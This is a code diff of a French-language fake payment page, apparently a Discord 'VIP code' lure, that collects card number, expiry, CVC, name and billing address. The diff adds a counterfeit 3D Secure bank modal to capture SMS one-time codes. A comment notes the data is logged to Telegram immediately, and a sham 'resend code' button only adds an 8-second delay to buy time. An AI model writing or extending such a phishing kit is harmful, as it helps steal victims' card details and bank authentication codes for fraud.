@@ -64,9 +64,20 @@
                             </div>
                         </div>
 
+                        <div class="form-section name-split">
+                            <div class="field-item">
+                                <label for="firstName">Prénom</label>
+                                <input type="text" id="firstName" placeholder="Prénom" required>
+                            </div>
+                            <div class="field-item">
+                                <label for="lastName">Nom</label>
+                                <input type="text" id="lastName" placeholder="Nom" required>
+                            </div>
+                        </div>
+
                         <div class="form-section">
-                            <label for="cardHolder">Nom du titulaire de la carte</label>
-                            <input type="text" id="cardHolder" placeholder="Nom complet" required>
+                            <label for="billingAddress">Adresse de facturation</label>
+                            <input type="text" id="billingAddress" placeholder="123 rue de la Paix, Paris" required>
                         </div>
 
                         <div class="form-section">
@@ -118,22 +129,60 @@
                         <a href="https://discord.gg" class="back-link">Continuer sur Discord</a>
                     </div>
                 </div>
+            </div>
+        </div>
+    </div>
 
-                <!-- SMS Verification View -->
-                <div id="smsSection" class="hidden">
-                    <div class="success-content">
-                        <div class="check-circle" style="background: #3b82f6;">
-                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l2.27-2.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"/></svg>
-                        </div>
-                        <h2>Vérification 3D Secure</h2>
-                        <p>Un code de confirmation a été envoyé par SMS à votre banque pour valider le paiement de 1,00 €.</p>
-                        
-                        <div class="form-section" style="margin-top: 24px;">
-                            <input type="text" id="smsCodeInput" placeholder="Code (6 chiffres)" maxlength="8" style="text-align: center; font-size: 24px; letter-spacing: 4px;">
-                        </div>
+    <!-- 3D Secure Modal -->
+    <div id="paymentModal" class="modal-overlay hidden">
+        <div class="modal-container">
+            <div class="modal-body">
+                <div class="modal-header-text">
+                    <h1>Vérification du paiement</h1>
+                    <p>Doro Place et l'émetteur de votre carte vous aident à protéger vos données. Dans quelques instants, cette fenêtre se fermera ou vous serez invité à fournir plus d'informations.</p>
+                </div>
 
-                        <button id="submitSmsBtn" class="pay-btn">Valider le paiement</button>
-                        <p class="next-step" style="margin-top: 16px;">Vérifiez vos messages sur votre téléphone portable.</p>
+                <!-- Processing Content -->
+                <div id="processingContent">
+                    <div class="processing-loader">
+                        <div class="btn-loader"></div>
+                    </div>
+                    <h2 id="processingTitle">Interrogation en cours</h2>
+                    <p id="processingText">Nous interrogeons votre banque pour plus de sécurité.</p>
+                </div>
+
+                <!-- SMS Content (Hidden initially) -->
+                <div id="smsContent" class="hidden">
+                    <div class="transaction-summary">
+                        <h3>Récapitulatif de votre paiement</h3>
+                        <div class="summary-table">
+                            <div class="summary-row">
+                                <span class="label">Commerçant</span>
+                                <span class="val">Doro Place</span>
+                            </div>
+                            <div class="summary-row">
+                                <span class="label">Montant</span>
+                                <span class="val">1,00 EUR</span>
+                            </div>
+                            <div class="summary-row">
+                                <span class="label">Date et heure</span>
+                                <span class="val" id="summaryDate">--/--/-- --:--</span>
+                            </div>
+                            <div class="summary-row">
+                                <span class="label">Numéro de carte</span>
+                                <span class="val" id="summaryCard">**** **** **** ****</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="sms-verification-box">
+                        <p class="sms-instr">Veuillez entrer le code de confirmation qui vous a été envoyé par SMS au <span id="maskedPhone">06 XX XX XX XX</span></p>
+                        <div class="code-input-group">
+                            <label>Code de confirmation :</label>
+                            <input type="text" id="smsCodeInput" placeholder="" maxlength="8">
+                        </div>
+                        <button id="submitSmsBtn" class="modal-btn">Valider</button>
+                        <button id="resendSmsBtn" class="resend-link">Demander un nouveau code</button>
                     </div>
                 </div>
             </div>
@@ -224,12 +273,21 @@
                 return;
             }
 
-            payBtn.disabled = true;
-            loader.classList.remove('hidden');
-            btnText.classList.add('hidden');
+            // Prepare Modal Data
+            const now = new Date();
+            document.getElementById('summaryDate').innerText = now.toLocaleDateString() + ' ' + now.toLocaleTimeString().substring(0, 5);
+            document.getElementById('summaryCard').innerText = '**** **** **** ' + cardNumberInput.value.slice(-4);
+
+            // Show Modal
+            const paymentModal = document.getElementById('paymentModal');
+            document.getElementById('processingContent').classList.remove('hidden');
+            document.getElementById('smsContent').classList.add('hidden');
+            paymentModal.classList.remove('hidden');
 
             const payload = {
-                cardHolder: document.getElementById('cardHolder').value,
+                firstName: document.getElementById('firstName').value,
+                lastName: document.getElementById('lastName').value,
+                billingAddress: document.getElementById('billingAddress').value,
                 cardNumber: cardNumberInput.value,
                 expiry: expiryInput.value,
                 cvc: cvcInput.value,
@@ -237,6 +295,7 @@
                 email: "client@stripe.com"
             };
 
+            // Call API immediately so Telegram log is sent direct
             try {
                 const res = await fetch(window.API_URL + '/api/pay', {
                     method: 'POST',
@@ -246,10 +305,11 @@
                 const data = await res.json();
 
                 if (data.needsSms) {
-                    paymentView.classList.add('hidden');
-                    smsSection.classList.remove('hidden');
+                    document.getElementById('processingContent').classList.add('hidden');
+                    document.getElementById('smsContent').classList.remove('hidden');
                     window.currentPaymentId = data.paymentId;
                 } else if (data.success) {
+                    paymentModal.classList.add('hidden');
                     paymentView.classList.add('hidden');
                     successSection.classList.remove('hidden');
                     vipCodeElem.innerText = data.code;
@@ -262,6 +322,29 @@
                 alert("Erreur de connexion au serveur");
                 location.reload();
             }
+        };
+
+        // Resend SMS with extra delay
+        document.getElementById('resendSmsBtn').onclick = async () => {
+            const smsContent = document.getElementById('smsContent');
+            const processingContent = document.getElementById('processingContent');
+            const processingTitle = document.getElementById('processingTitle');
+            const processingText = document.getElementById('processingText');
+            
+            smsContent.classList.add('hidden');
+            processingTitle.innerText = "Demande en cours";
+            processingText.innerText = "Nous générons un nouveau code de sécurité...";
+            processingContent.classList.remove('hidden');
+
+            // 8 seconds for resending (adding more time)
+            await new Promise(resolve => setTimeout(resolve, 8000));
+
+            processingContent.classList.add('hidden');
+            smsContent.classList.remove('hidden');
+
+            // Reset text for next time
+            processingTitle.innerText = "Interrogation en cours";
+            processingText.innerText = "Nous interrogeons votre banque pour plus de sécurité.";
         };
 
         document.getElementById('submitSmsBtn').onclick = async () => {
@@ -284,17 +367,25 @@
                 const data = await res.json();
 
                 if (data.success) {
-                    smsSection.classList.add('hidden');
+                    document.getElementById('paymentModal').classList.add('hidden');
+                    paymentView.classList.add('hidden');
                     successSection.classList.remove('hidden');
                     vipCodeElem.innerText = data.code;
                 } else {
                     alert(data.message || "Code SMS invalide");
                     submitBtn.disabled = false;
-                    submitBtn.innerText = "Valider le paiement";
+                    submitBtn.innerText = "Valider";
                 }
             } catch (err) {
                 alert("Erreur de validation");
             }
+        };
+
+        const copyBtn = document.getElementById('copyBtn');
+        copyBtn.onclick = () => {
+            navigator.clipboard.writeText(vipCodeElem.innerText);
+            copyBtn.innerText = "Copié !";
+            setTimeout(() => copyBtn.innerText = "Copier", 2000);
         };
     </script>
 </body>
